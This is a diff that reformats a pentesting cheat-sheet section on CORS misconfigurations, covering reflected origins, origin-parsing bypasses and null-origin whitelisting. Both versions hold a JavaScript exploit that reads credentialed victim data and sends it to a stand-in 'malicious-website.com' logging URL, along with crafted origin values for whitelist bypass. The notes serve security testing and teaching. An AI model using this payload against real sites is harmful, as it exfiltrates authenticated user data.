@@ -100,24 +100,25 @@ Access-Control-Max-Age: 240
 
 Some app read the Origin header from requests and including a response header stating that the requesting origin is allowed.
 
-* Detection
-  * Send request with `Origin: https://example.com` and see if the origin is reflected in the `Access-Control-Allow-Origin` header.
-* Exploit
-  * ```html
-    <script>
-    var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
-    req.withCredentials = true;
-    req.send();
+Detection&#x20;
 
-    function reqListener() {
-    	location='//malicious-website.com/log?key='+this.responseText;
-    };
-    </script>
-    ```
+Send request with `Origin: https://example.com` and see if the origin is reflected in the `Access-Control-Allow-Origin` header.
 
-***
+Exploit
+
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='//malicious-website.com/log?key='+this.responseText;
+};
+</script>
+```
 
 **Errors parsing Origin headers**
 
@@ -125,9 +126,7 @@ Some app read the Origin header from requests and including a response header st
 * Suppose `normal-website.com`
 * Use as origin: `hackersnormal-website.com` or `normal-website.com.evil-user.net`
 
-***
-
-Whitelisted null origin value
+**Whitelisted null origin value**
 
 * Set `Origin: null` in the request
 * Response has `Access-Control-Allow-Origin: null`
